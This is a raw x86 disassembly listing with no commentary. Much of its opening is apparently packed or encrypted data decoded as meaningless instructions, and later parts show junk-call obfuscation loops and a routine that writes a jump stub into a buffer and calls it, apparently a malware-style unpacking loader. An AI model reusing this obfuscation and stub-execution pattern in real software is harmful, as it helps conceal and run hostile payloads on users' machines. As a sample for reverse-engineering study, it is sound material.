  416b68:	cld    
  416b69:	add    BYTE PTR [ebx],bl
  416b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b6c:	imul   ecx,DWORD PTR ds:0x359cd9db,0xffffffa5
  416b73:	ret    0x33fe
  416b76:	xor    dh,BYTE PTR [edi-0x4f8d951]
  416b7c:	xchg   edi,eax
  416b7d:	icebp  
  416b7e:	inc    ecx
  416b7f:	es stc 
  416b81:	neg    DWORD PTR [ebx]
  416b83:	std    
  416b84:	sbb    ecx,edx
  416b86:	lds    eax,FWORD PTR [ebp-0x74]
  416b89:	retf   0x1500
  416b8c:	test   al,0xad
  416b8e:	sbb    al,0x6
  416b90:	mov    bl,0xb3
  416b92:	mov    cs,WORD PTR [edi-0x41]
  416b95:	out    0x9a,eax
  416b97:	sub    ecx,0xffffffa5
  416b9a:	or     DWORD PTR [esi],eax
  416b9c:	adc    eax,0x41e00f7a
  416ba1:	mov    dh,0x53
  416ba3:	loopne 0x416b7a
  416ba5:	sbb    al,BYTE PTR ds:0xdcd71f4b
  416bab:	stos   BYTE PTR es:[edi],al
  416bac:	xchg   ebp,eax
  416bad:	mov    al,0xa1
  416baf:	dec    eax
  416bb0:	daa    
  416bb1:	ret    
  416bb2:	mov    ebp,0x3e43e7da
  416bb7:	mov    eax,0x9644396d
  416bbc:	ins    DWORD PTR es:[edi],dx
  416bbd:	pushf  
  416bbe:	pop    edi
  416bc0:	test   ch,dl
  416bc2:	xlat   BYTE PTR ds:[ebx]
  416bc3:	jno    0x416b62
  416bc5:	je     0x416b80
  416bc7:	outs   dx,BYTE PTR ds:[esi]
  416bc8:	ss and cl,al
  416bcb:	add    DWORD PTR [ecx],0x7076720a
  416bd1:	aam    0x9f
  416bd3:	inc    ebp
  416bd4:	pop    esi
  416bd5:	sub    DWORD PTR [eax],0xe1290d76
  416bdb:	outs   dx,BYTE PTR ds:[esi]
  416bdc:	das    
  416bdd:	into   
  416bde:	ss cli 
  416be0:	scas   al,BYTE PTR es:[edi]
  416be1:	popa   
  416be2:	fiadd  DWORD PTR [edx+0x65]
  416be5:	sbb    DWORD PTR [edi+ebp*2],ecx
  416be8:	aad    0xe9
  416bea:	inc    edx
  416beb:	mov    edx,0xf407c8e3
  416bf0:	mov    DWORD PTR [edx+0x1d0bf330],ebp
  416bf6:	not    DWORD PTR [esi+0x4cc5c592]
  416bfc:	xchg   ebx,eax
  416bfd:	cs fs mov esi,0xc723c223
  416c04:	push   ds
  416c05:	fstp   QWORD PTR [edi-0x7f88b5e]
  416c0b:	call   DWORD PTR [edx-0x3e]
  416c0e:	cmp    al,0xb2
  416c10:	shl    BYTE PTR [ebp-0x1f],cl
  416c13:	test   BYTE PTR [esi-0x22],dl
  416c16:	xor    edx,DWORD PTR [eax-0x752f15eb]
  416c1c:	aaa    
  416c1d:	pop    edi
  416c1e:	int3   
  416c1f:	popa   
  416c20:	cmc    
  416c21:	inc    ebx
  416c22:	sub    bh,ah
  416c24:	out    dx,eax
  416c25:	sbb    ebx,DWORD PTR [ebp-0x15f0bfab]
  416c2b:	aad    0xb6
  416c2d:	jl     0x416c09
  416c2f:	shr    BYTE PTR [ecx+0x25],0xf0
  416c33:	inc    eax
  416c34:	pop    ecx
  416c35:	inc    ebp
  416c36:	in     al,0x7a
  416c38:	and    cl,BYTE PTR [ebp-0x5d]
  416c3b:	mov    al,0x6e
  416c3d:	sar    BYTE PTR [edi+0x2a],0x2
  416c41:	bts    DWORD PTR [ebx-0x44],edi
  416c45:	xlat   BYTE PTR ds:[ebx]
  416c46:	adc    BYTE PTR [ebp+0x53],dh
  416c49:	repz xor edi,edx
  416c4c:	out    dx,eax
  416c4d:	mov    ch,0x3e
  416c4f:	and    BYTE PTR [ebp+ecx*1+0x1e89a07f],ah
  416c56:	mov    eax,ds:0x4cff2fda
  416c5b:	mov    dl,0x35
  416c5d:	dec    edx
  416c5e:	mov    dl,0x11
  416c60:	es ret 
  416c62:	push   eax
  416c63:	or     edx,ecx
  416c65:	stos   BYTE PTR es:[edi],al
  416c66:	mov    WORD PTR [edx-0x3d],?
  416c69:	(bad)  
  416c6a:	rcr    ah,cl
  416c6c:	dec    ebx
  416c6d:	inc    ebp
  416c6e:	mov    eax,0x7e47b25e
  416c73:	sub    al,dl
  416c75:	jne    0x416c60
  416c77:	out    0x86,al
  416c79:	icebp  
  416c7a:	sub    DWORD PTR [esp+ebx*4-0x2],esi
  416c7e:	sub    ch,BYTE PTR [esi]
  416c80:	push   eax
  416c81:	cld    
  416c82:	inc    edi
  416c83:	sar    DWORD PTR [ebx],1
  416c85:	mov    bl,0x8e
  416c87:	pusha  
  416c88:	mov    ah,0xb4
  416c8a:	fidivr WORD PTR [ecx+0x4f]
  416c8d:	leave  
  416c8e:	cli    
  416c8f:	sub    eax,0x82a8cc03
  416c94:	push   ebx
  416c95:	sbb    edi,DWORD PTR [eax-0x4e98b87a]
  416c9b:	shl    DWORD PTR [eax-0x4270019d],1
  416ca1:	xor    al,0xfc
  416ca3:	sub    ebp,ebp
  416ca5:	nop
  416ca6:	xor    dl,bl
  416ca8:	out    0x24,eax
  416caa:	mov    ds:0xb529d745,eax
  416caf:	jecxz  0x416ccb
  416cb1:	scas   eax,DWORD PTR es:[edi]
  416cb2:	cmp    al,0x3d
  416cb4:	pop    edi
  416cb5:	cs mov ebp,0x2d7bca4c
  416cbb:	adc    al,0xb4
  416cbd:	fimul  WORD PTR [ebx-0x55]
  416cc0:	sbb    al,BYTE PTR [ebx+0x1]
  416cc3:	mov    esi,0xf1baa08
  416cc8:	addr16 cmp edi,ebp
  416ccb:	ds loope 0x416d10
  416cce:	inc    ebp
  416ccf:	xor    ebx,DWORD PTR [ebx]
  416cd1:	mov    ebx,DWORD PTR [ebp-0x8]
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428cf1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af55
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428cfd
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d51
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d65
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d65
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
